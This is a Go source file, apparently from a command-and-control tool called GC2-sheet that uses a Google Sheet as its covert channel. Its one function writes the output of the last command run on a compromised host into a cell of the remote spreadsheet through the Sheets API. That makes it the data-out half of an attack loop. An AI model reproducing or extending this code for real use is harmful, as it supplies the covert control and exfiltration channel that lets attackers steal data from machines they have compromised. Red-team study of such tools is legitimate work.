package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"google.golang.org/api/sheets/v4"
	"strconv"
)

func writeSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet, lastCommand *configuration.Commands)  {

	sheetName := spreadSheet.CommandSheet.Name
	rangeCell := lastCommand.RangeOut
	rangeId := strconv.Itoa(lastCommand.RangeId)
	// Example: Sheet1!A2
	range2 := sheetName + rangeCell + rangeId

	outputCommand := lastCommand.Output
	var output [][]interface{}
	output = append(output, make([]interface{},1))

	output[0][0] = outputCommand

	valueRange := &sheets.ValueRange{
		Range:  range2,
		Values: output,
	}

	valueInputOption := "RAW"

	_, err := client.Spreadsheets.Values.Update(spreadSheet.SpreadSheetId, range2, valueRange).ValueInputOption(valueInputOption).Do()

	if err != nil {
		utils.LogFatalDebug("[-] Cannot write on remote sheet: " + err.Error())
	}

}
